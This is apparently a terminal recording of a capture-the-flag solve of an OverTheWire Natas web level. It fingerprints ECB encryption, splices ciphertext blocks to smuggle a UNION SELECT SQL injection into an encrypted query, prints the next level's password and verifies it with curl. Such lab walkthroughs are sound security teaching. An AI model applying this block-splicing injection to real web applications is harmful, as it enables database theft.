[0.374, "o", "   a*16 ->  96 bytes (6 blocks)\r\n$ probe: identical plaintext blocks encrypt identically (ECB fingerprint):\r\n"]
[0.369, "o", "   A*64 -> ['1be82511a7ba', 'dc84728fdcf8', '5f22a727f625', 'f633e6b05f86', 'f633e6b05f86', 'f633e6b05f86', 'e3df361c6393', 'a77e8ed1aabe', '478eb1a1fe26']\r\n   -> three identical blocks confirm ECB, so we can splice blocks.\r\n$ find where our input starts: 'a'*8 and 'a'*12 share block 2, 13 changes it\r\n"]
[0.372, "o", "   a*8  -> ['1be82511a7ba', 'dc84728fdcf8', '453e0020602f', '896de90884f8', '917232051483']\r\n"]
[0.370, "o", "   a*12 -> ['1be82511a7ba', 'dc84728fdcf8', 'c0872dee8bc9', 'ce82a9553b65', '75fd5044fd06']\r\n"]
[0.375, "o", "   a*13 -> ['1be82511a7ba', 'dc84728fdcf8', 'c0872dee8bc9', '1f74714d76fc', '6223a14d9c42', 'd8ae51d7da71']\r\n"]
[0.007, "o", "$ plan: the plaintext is  <prefix 10 bytes> + our query + <padding>.\r\n$   Block 2 = prefix(10) + \"a\"*6  -- constant, we keep it.\r\n$   Query \"a\"*8 gives 5 blocks: [0][1][2 = prefix+aaaaaa][3][4]\r\n$   Query \"b\"*10 + payload shifts the payload to start exactly at block 3:\r\n$     block 3 = \" UNION SELECT 1-- \" + closing quote + filler\r\n$   Splice: blocks[0..2] from the 8-byte query + blocks[3..] from the payload\r\n$   query -> a valid ciphertext whose plaintext is prefix + our SQL.\r\n$ the SQL then runs as: ... WHERE joke LIKE '<our payload>%' -- closing the\r\n$   quote and using -- to drop the rest. UNION SELECT password FROM users\r\n"]
[0.409, "o", "   base blocks: ['1be82511a7ba', 'dc84728fdcf8', '453e0020602f', '896de90884f8', '917232051483']\r\n"]
[0.378, "o", "$ payload: ' UNION SELECT 1-- '\r\n   payload blocks: ['1be82511a7ba', 'dc84728fdcf8', '5c805cbd29fb', 'bd122ab77244', '8afe54e01055', '75fd5044fd06']\r\n"]
[0.373, "o", "   result: <li>1</li>\r\n"]
[0.374, "o", "$ payload: ' UNION SELECT password FROM users-- '\r\n   payload blocks: ['1be82511a7ba', 'dc84728fdcf8', '5c805cbd29fb', '49c7ba591489', '043003a0d0e6', '91f8d230c184', '4257a343daad', '7b7baca655f2']\r\n"]
[0.369, "o", "   result: <li>hwgoYUiGWoSZAqphtCAZf7u1jS16KEah</li>\r\n"]
[0.005, "o", "$ verify: curl -u natas29:<pw> http://natas29.natas.labs.overthewire.org/ -> 200\r\n"]
